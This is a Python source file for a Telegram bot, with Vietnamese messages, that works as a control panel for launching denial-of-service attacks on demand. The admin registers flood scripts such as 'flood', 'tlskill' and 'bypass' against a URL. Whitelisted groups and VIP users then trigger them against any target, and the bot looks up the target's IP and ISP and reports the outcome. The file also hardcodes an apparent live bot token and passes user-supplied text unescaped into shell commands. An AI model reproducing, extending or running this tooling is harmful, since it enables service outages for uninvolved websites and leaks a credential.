import time, json, asyncio, socket, requests, os
from urllib import parse
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler
from pytz import timezone
from html import escape

TOKEN = '7534473375:AAEu7g1K31B4ckivIqKEz0Ecx49XPOGLrLs'
ADMIN_ID = 7371969470
VIP_USERS_FILE, METHODS_FILE, GROUPS_FILE = 'vip_users.json', 'methods.json', 'groups.json'
user_processes = {}

def load_json(file): return json.load(open(file, 'r')) if os.path.exists(file) else save_json(file, {}) or {}
def save_json(file, data): json.dump(data, open(file, 'w'), indent=4)
def get_vietnam_time(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')
def get_ip_and_isp(url): 
    try: ip = socket.gethostbyname(parse.urlsplit(url).netloc); response = requests.get(f"http://ip-api.com/json/{ip}")
    except: return None, None
    return ip, response.json() if response.ok else None

async def pkill_handler(update, context): 
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    for cmd in ["pkill -9 -f flood", "pkill -9 -f tlskill", "pkill -9 -f bypass", "pkill -9 -f killer"]:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        if stderr: return await context.bot.send_message(ADMIN_ID, "Error occurred.")
    return await context.bot.send_message(ADMIN_ID, "Processes Killed Successfully.")

async def command_handler(update, context, handler_func, min_args, help_text): 
    if len(context.args) < min_args: return await context.bot.send_message(ADMIN_ID, help_text)
    await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    if len(context.args) < 2: return await context.bot.send_message(ADMIN_ID, "Usage: /add <method_name> <url> timeset <time> [vip/member]")
    method_name, url, attack_time = context.args[0], context.args[1], 60
    if 'timeset' in context.args: 
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await context.bot.send_message(ADMIN_ID, "Invalid time.")
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    command = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join([arg for arg in context.args[2:] if arg not in ['[vip]', '[member]', 'timeset']])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time, 'visibility': visibility}
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(ADMIN_ID, f"Method {method_name} added as {visibility}.")

async def delete_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Usage: /del <method_name>")
    method_name = context.args[0]
    if method_name not in methods_data: return await context.bot.send_message(ADMIN_ID, f"Method {method_name} not found.")
    del methods_data[method_name]
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(ADMIN_ID, f"Method {method_name} deleted.")

async def attack_method(update, context, methods_data, vip_users, groups_data, method_name):
    user_id, chat_id = update.message.from_user.id, update.message.chat.id
    if chat_id not in groups_data: return await context.bot.send_message(ADMIN_ID, "Nhóm này không được phép.")
    if user_id in user_processes and user_processes[user_id].returncode is None:
        return await context.bot.send_message(ADMIN_ID, "Người dùng đã có cuộc tấn công đang diễn ra.")
    if method_name not in methods_data: return await context.bot.send_message(ADMIN_ID, "Phương thức không tồn tại.")
    method = methods_data[method_name]
    if method['visibility'] == 'VIP' and user_id != ADMIN_ID and user_id not in vip_users: 
        return await context.bot.send_message(ADMIN_ID, "Người dùng cố gắng truy cập phương thức VIP.")
    
    attack_time = method['time']
    ip, isp_info = get_ip_and_isp(update.message.text.split(" ")[1])
    if not ip: return await context.bot.send_message(ADMIN_ID, "Không thể lấy IP.")
    
    command = method['command'].replace(method['url'], update.message.text.split(" ")[1]).replace(str(method['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username, start_time = update.message.from_user.username or update.message.from_user.full_name, time.time()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Kiểm tra trạng thái", url=f"https://check-host.net/check-http?host={update.message.text.split(' ')[1]}")]])
    
    await context.bot.send_message(ADMIN_ID, f"Tấn công {method_name} bởi @{username}.\nISP:\n<pre>{escape(isp_info_text)}</pre>\nThời gian: {attack_time}s\nBắt đầu: {get_vietnam_time()}", parse_mode='HTML', reply_markup=keyboard)
    asyncio.create_task(execute_attack(command, update, method_name, start_time, attack_time, user_id, context))

async def execute_attack(command, update, method_name, start_time, attack_time, user_id, context):
    error_message = None
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[user_id] = process
    except Exception as e:
        error_message = str(e)
        end_time, attack_status = time.time(), "failed"
    else:
        stdout, stderr = await process.communicate()
        error_message = stderr.decode() if stderr else None
        end_time, attack_status = time.time(), "success" if not stderr else "failed"
    
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name, "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": get_vietnam_time(), "end_time": get_vietnam_time(),
        "elapsed_time": elapsed_time, "attack_status": attack_status, "error": error_message or "None"
    }
    safe_attack_info_text = escape(json.dumps(attack_info, indent=2, ensure_ascii=False))
    await context.bot.send_message(ADMIN_ID, f"Tấn công hoàn tất! Thời gian: {elapsed_time}s.\n\nChi tiết:\n<pre>{safe_attack_info_text}</pre>", parse_mode='HTML')
    del user_processes[user_id]

async def list_methods(update, context, methods_data):
    if not methods_data: return await context.bot.send_message(ADMIN_ID, "Không có phương thức nào.")
    methods_list = "\n".join([f"{name} ({data['visibility']}): {data['time']}s" for name, data in methods_data.items()])
    await context.bot.send_message(ADMIN_ID, f"Các phương thức có sẵn:\n{methods_list}")

async def manage_vip_user(update, context, vip_users, action):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, f"Usage: /{'vipuser' if action == 'add' else 'delvip'} <uid>")
    user_id = int(context.args[0])
    if action == "add":
        vip_users.add(user_id)
        save_json(VIP_USERS_FILE, list(vip_users))
        return await context.bot.send_message(ADMIN_ID, f"User {user_id} added to VIP list.")
    else:
        if user_id in vip_users:
            vip_users.remove(user_id)
            save_json(VIP_USERS_FILE, list(vip_users))
            return await context.bot.send_message(ADMIN_ID, f"User {user_id} removed from VIP list.")
        return await context.bot.send_message(ADMIN_ID, f"User {user_id} is not in VIP list.")

async def add_group(update, context, groups_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Usage: /addgroup <group_id>")
    group_id = int(context.args[0])
    groups_data.add(group_id)
    save_json(GROUPS_FILE, list(groups_data))
    return await context.bot.send_message(ADMIN_ID, f"Group {group_id} added.")

async def del_group(update, context, groups_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Unauthorized.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Usage: /delgroup <group_id>")
    group_id = int(context.args[0])
    if group_id in groups_data:
        groups_data.remove(group_id)
        save_json(GROUPS_FILE, list(groups_data))
        return await context.bot.send_message(ADMIN_ID, f"Group {group_id} removed.")
    return await context.bot.send_message(ADMIN_ID, f"Group {group_id} not found.")

async def help_message(update, context):
    return await context.bot.send_message(update.message.chat_id, """
    /methods - Liệt kê các phương thức
    /add <method_name> <url> timeset <time> [vip/member] - Thêm phương thức
    /del <method_name> - Xóa phương thức
    /vipuser <uid> - Thêm người dùng vào danh sách VIP
    /delvip <uid> - Xóa người dùng khỏi danh sách VIP
    /addgroup <group_id> - Thêm nhóm
    /delgroup <group_id> - Xóa nhóm
    """)

def main():
    methods_data, vip_users, groups_data = load_json(METHODS_FILE), set(load_json(VIP_USERS_FILE)), set(load_json(GROUPS_FILE))
    app = ApplicationBuilder().token(TOKEN).build()
    for method_name in methods_data: app.add_handler(CommandHandler(method_name, lambda u, c, method_name=method_name: attack_method(u, c, methods_data, vip_users, groups_data, method_name)))
    app.add_handler(CommandHandler("methods", lambda u, c: list_methods(u, c, methods_data)))
    app.add_handler(CommandHandler("add", lambda u, c: add_method(u, c, methods_data)))
    app.add_handler(CommandHandler("del", lambda u, c: delete_method(u, c, methods_data)))
    app.add_handler(CommandHandler("vipuser", lambda u, c: manage_vip_user(u, c, vip_users, "add")))
    app.add_handler(CommandHandler("delvip", lambda u, c: manage_vip_user(u, c, vip_users, "remove")))
    app.add_handler(CommandHandler("addgroup", lambda u, c: add_group(u, c, groups_data)))
    app.add_handler(CommandHandler("delgroup", lambda u, c: del_group(u, c, groups_data)))
    app.add_handler(CommandHandler("pkill", pkill_handler))
    app.add_handler(CommandHandler("help", help_message))
    app.run_polling()

if __name__ == '__main__':
    main()
